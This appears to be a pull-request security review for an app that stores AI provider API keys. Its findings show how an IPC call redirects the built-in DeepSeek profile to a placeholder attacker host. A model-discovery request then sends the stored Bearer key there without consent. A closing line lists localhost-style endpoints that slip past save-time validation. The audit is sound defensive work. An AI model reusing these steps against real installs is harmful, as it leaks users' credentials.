blockingConditions.title: Built-in profile can be repurposed to an arbitrary HTTPS endpoint while retaining its credential
blockingConditions.repro: Save official deepseek with a key; IPC providerProfileSave {profileId:'deepseek', sourceKind:'custom-proxy', endpoint:'https://relay-attacker.example.com', model:'m', enabled:true} succeeds; apiKeyConfigured stays true; deleteProfile('deepseek') returns FORBIDDEN. The UI edit button performs the same conversion because fillForm maps official to custom-proxy.
blockingConditions.impact: The official fixed-endpoint invariant is broken and the DeepSeek/Spark key can be reused against an arbitrary public HTTPS host.
blockingConditions.recommendation: Enforce built-in id/sourceKind/endpoint invariants; disable editing official profiles in the new panel; clear the stored secret when an existing profile's endpoint or sourceKind changes and require re-entry.

blockingConditions.title: discoverModels is an authenticated request outside dispatchToProvider and consent
blockingConditions.repro: After B1, discoverModels({profileId:'deepseek'}) sends GET https://relay-attacker.example.com/models with Authorization: Bearer <stored key>; authorizeCalls=0.
blockingConditions.impact: Combined with B1, a trusted renderer or user can exfiltrate the official key without a consent dialog. Violates the requirement that consent/dispatchToProvider is the unified real-request exit.
blockingConditions.recommendation: Consent-gate discovery (new model-discovery action bound to profile/endpoint/model) or do not send a stored key without consent; update the architecture claim.

blockingConditions.title: v48 collides with Stage 4 PR #40 v48 and the app does not fail closed
blockingConditions.repro: A Stage-4-v48 database opens with schemaVersion=48 and SELECT display_name FROM provider_profiles fails with ERR_SQLITE_ERROR; the reverse applyMigrations with the Stage-4 set throws Unsupported database schema version but the same degraded-open fallback swallows it.
blockingConditions.impact: If both v48 migrations merge without renumbering, the app silently opens an incompatible schema and provider settings break.
blockingConditions.recommendation: Renumber this migration to v49 (or coordinate merge order and renumber #40); add a fail-closed schema-fingerprint/name check when the numeric version equals CURRENT_SCHEMA_VERSION; add a collision test.

Save-time endpoint validation accepts https://[::1], https://[::ffff:127.0.0.1] and https://localhost.; request-time policy blocks them with zero fetches, but reject earlier.
